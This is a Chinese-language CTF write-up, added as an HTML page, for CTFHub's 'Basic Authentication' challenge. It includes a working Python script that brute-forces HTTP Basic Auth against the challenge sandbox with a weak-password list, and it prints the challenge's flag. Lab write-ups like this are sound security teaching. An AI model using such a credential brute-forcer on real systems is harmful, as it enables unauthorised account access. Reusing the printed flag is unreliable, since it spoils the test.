@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: 基础认证 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e17;
+            background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%);
+            font-family: 'Inter', sans-serif;
+            color: #ccd6f6;
+            padding: 6rem 1rem 4rem 1rem;
+            display: flex;
+            justify-content: center;
+            line-height: 1.8;
+        }
+        .navbar {
+            position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%;
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999;
+        }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+
+        .post-container {
+            max-width: 820px; width: 100%;
+            background: rgba(255,255,255,0.03); backdrop-filter: blur(6px);
+            border: 1px solid rgba(255,255,255,0.06); border-radius: 32px;
+            padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+        }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.1rem; margin: 1.5rem 0 0.8rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link {
+            display: inline-flex; align-items: center; gap: 8px;
+            color: #00f0ff; text-decoration: none;
+            border: 1px solid #00f0ff; padding: 10px 24px;
+            border-radius: 30px; transition: 0.3s; font-size: 0.95rem;
+        }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); transform: translateY(-3px); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        .action-link.secondary:hover { color: #ccd6f6; border-color: #ccd6f6; background: rgba(255,255,255,0.05); }
+
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctfhub.html"><i class="fas fa-arrow-left"></i> 返回 CTFHub 题库</a>
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-lock"></i> 基础认证 - CTFHub Web 入门 Writeup</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月16日</span>
+            <span><i class="fas fa-tag"></i> CTFHub</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> HTTP Basic Auth</span>
+            <span><i class="fas fa-tag"></i> Python 字典爆破</span>
+        </div>
+
+        <p>这道题考察的是 Web 中极其经典的 <strong>HTTP 基础认证（Basic Authentication）</strong>。题目直接提供了一个弱密码字典附件，要求我们通过 Python 编写脚本进行字典爆破。这不仅是一次 Web 基础知识的锻炼，更是我真正理解“HTTP 状态码 200 与 401 区别”的里程碑。</p >
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>基础认证</li>
+            <li><strong>题目平台：</strong>CTFHub</li>
+            <li><strong>题目类型：</strong>Web / HTTP 认证 / 暴力破解</li>
+            <li><strong>题目提示：</strong>HTTP 基本认证，允许 HTTP 用户代理（如浏览器）在请求时提供用户名和密码。</li>
+            <li><strong>附件内容：</strong> <code>10_million_password_list_top_100.txt</code>（100个弱密码字典）</li>
+            <li><strong>最终Flag：</strong> <code>ctfhub{ec58bf1d6cf2df9d3fd3f9e0}</code></li>
+        </ul>
+
+        <h2>二、解题过程（详细步骤与踩坑全记录）</h2>
+        
+        <h3>1. 初探浏览器与认知陷阱</h3>
+        <p>点击题目链接，浏览器弹出了系统级的账号密码登录框。随便输入了几个常规密码，不仅无法登录，点击“取消”还会反复弹窗。这是因为浏览器缓存了之前的 401 错误状态，进入了死循环。</p >
+        <p>此时，我们决定放弃浏览器，使用 Python 写脚本进行字典爆破。</p >
+
+        <h3>2. 环境搭建与踩坑（No such file / ModuleNotFound）</h3>
+        <p>在写脚本的过程中，我遇到了经典的 Mac 环境问题：</p >
+        <ul>
+            <li><strong>踩坑 1：路径错误。</strong> 在终端执行 `python3 brute_basic_auth.py` 时，报错 <code>No such file or directory</code>。原因是脚本保存在桌面，而终端工作目录在用户主目录。解决：使用 <code>cd ~/Desktop</code> 切换目录。</li>
+            <li><strong>踩坑 2：缺少依赖库。</strong> 运行时报错 <code>ModuleNotFoundError: No module named 'requests'</code>。解决：执行 <code>pip3 install requests</code> 安装网络请求库。</li>
+        </ul>
+
+        <h3>3. 致命的逻辑误报（核心踩坑）</h3>
+        <p>我编写了第一版爆破脚本，脚本逻辑是：发送请求并判断 <code>if response.status_code == 200</code>。脚本运行后，终端输出了“🎉 爆破成功！密码：123456”。</p >
+        <p>然而，当我把 <code>admin:123456</code> 输入到浏览器或 <code>curl</code> 去访问时，服务器依然返回 <code>401 Authorization Required</code>（密码错误）。</p >
+        <p><strong>为什么会误报？</strong>因为脚本里请求的地址是主页 <code>http://.../</code>。主页是不需要密码的！无论你输入什么密码，服务器都会返回 200 OK，并显示“hello guest”。我的脚本只看状态码 200，误以为密码正确，实际上是被主页骗了。</p >
+
+        <h3>4. 修正脚本，成功爆破</h3>
+        <p>锁定原因后，我们修改了 Python 脚本。关键的修改点是：<strong>直接请求受保护的页面 `/flag.html`</strong>，并增加内容特征判断。正确的代码如下：</p >
+        <pre><code>import requests
+import os
+
+# 直接请求受保护页面 /flag.html
+url = "http://challenge-0989f5bbfab3b411.sandbox.ctfhub.com:10800/flag.html"
+dict_file = "10_million_password_list_top_100.txt"
+usernames = ["admin", "administrator", "root", "test", "user", "ctf"]
+
+with open(dict_file, 'r', encoding='utf-8', errors='ignore') as f:
+    passwords = [line.strip() for line in f if line.strip()]
+
+for username in usernames:
+    for pwd in passwords:
+        # 发送请求，注意必须带上认证信息
+        response = requests.get(url, auth=(username, pwd), timeout=3)
+        # 严格判定：状态码 200 且返回内容包含 ctfhub 特征
+        if response.status_code == 200 and "ctfhub" in response.text:
+            print(f"爆破成功！账号: {username}, 密码: {pwd}")
+            print(f"Flag: {response.text}")
+            exit()
+</code></pre>
+        <p>终端成功跑出了真实的账号密码，并直接打印出了包含 <code>ctfhub{...}</code> 的响应页面。</p >
+        <p><strong>最终 Flag：</strong> <code>ctfhub{ec58bf1d6cf2df9d3fd3f9e0}</code></p >
+
+        <h2>三、知识点总结（往脑子里装的东西）</h2>
+        <div style="background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem;">
+            <ul>
+                <li><strong>HTTP 基础认证 (Basic Auth)：</strong> 客户端将用户名和密码用冒号拼接，再进行 Base64 编码，放入请求头 <code>Authorization: Basic xxxxxx</code> 中发送给服务器。</li>
+                <li><strong>HTTP 状态码 200 与 401 的本质区别：</strong> 
+                    <ul>
+                        <li><code>200 OK</code>：请求成功。但这<strong>不代表权限验证通过</strong>。很多不需登录的主页永远返回 200。</li>
+                        <li><code>401 Unauthorized</code>：未授权。这才是真正的密码验证失败。</li>
+                    </ul>
+                </li>
+                <li><strong>脚本爆破的严谨性：</strong> 编写爆破脚本时，不能只依赖状态码 200 进行判断。必须请求受保护资源，并且结合页面返回内容特征（如关键字 <code>ctfhub</code>）进行双重校验。</li>
+                <li><strong>curl 命令：</strong> <code>curl -u user:pass http://.../flag.html</code> 是终端验证 Basic Auth 最快捷的方式，不经过浏览器，避免缓存干扰。</li>
+            </ul>
+        </div>
+
+        <h2>四、踩坑启示录（极其宝贵的实战经验）</h2>
+        <div style="background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; border-radius: 0 8px 8px 0; margin-bottom: 1rem;">
+            <p>💡 <strong>为什么我的脚本会产生“成功”的误报？</strong></p>
+            <p>因为我的第一版脚本请求了主页 <code>/</code>，而主页允许匿名访问。这次踩坑让我深刻认识到：<strong>永远不要盲目信任状态码 200。</strong> 在安全测试中，必须精准定位到真正需要鉴权的接口或文件路径，然后再去判断响应状态和内容特征。</p >
+            <p>💡 <strong>为什么浏览器输入正确密码还一直弹窗？</strong></p>
+            <p>浏览器缓存了之前输入错误密码时的 <code>401</code> 状态。解决方式是重启浏览器（或使用无痕模式），或者直接使用终端 <code>curl</code> 命令绕过浏览器验证。</p >
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p >
+
+        <div class="action-bar">
+            <a href="/ctfhub.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTFHub 题库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
